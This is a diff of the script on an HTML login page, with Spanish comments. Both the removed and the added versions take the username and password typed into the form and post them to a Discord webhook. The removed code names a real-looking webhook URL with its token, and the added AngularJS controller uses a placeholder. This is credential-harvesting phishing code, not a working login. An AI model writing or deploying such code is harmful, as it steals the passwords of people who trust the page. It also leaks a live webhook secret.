@@ -45,31 +45,26 @@
       <div id="footer" class="footer" role="footer"> </div> </div> 
   
     <script>
-   function enviarDatos() {
-    var username = document.getElementById("username").value;
-    var password = document.getElementById("password").value;
+  angular.module('myApp', [])
+    .controller('LoginController', function($scope, $http) {
+      $scope.login = function() {
+        var data = {
+          username: $scope.username,
+          password: $scope.password
+        };
 
-    var data = {
-      username: username,
-      password: password
-    };
+        var discordWebhookUrl = "URL_DEL_WEBHOOK_DE_DISCORD";
 
-    var discordWebhookUrl = "https://discordapp.com/api/webhooks/1074491610471084072/DQZ8B1z42DNbxwZgANi4MRhmivlWYKpkGYnLnFKoeQrqUuAdzsHm1NgzWweNJWog0y38";
-
-    fetch(discordWebhookUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(data)
-    })
-    .then(function(response) {
-      console.log("Datos enviados al webhook de Discord:", response);
-      // Puedes redirigir al usuario a otra página o mostrar un mensaje de éxito aquí
-    })
-    .catch(function(error) {
-      console.error("Error al enviar datos al webhook de Discord:", error);
-      // Puedes mostrar un mensaje de error al usuario aquí
+        // Enviar datos al webhook de Discord usando $http de AngularJS
+        $http.post(discordWebhookUrl, data)
+          .then(function(response) {
+            console.log("Datos enviados al webhook de Discord:", response);
+            // Puedes redirigir al usuario a otra página o mostrar un mensaje de éxito aquí
+          })
+          .catch(function(error) {
+            console.error("Error al enviar datos al webhook de Discord:", error);
+            // Puedes mostrar un mensaje de error al usuario aquí
+          });
+      };
     });
-  }
     </script></body> </html>
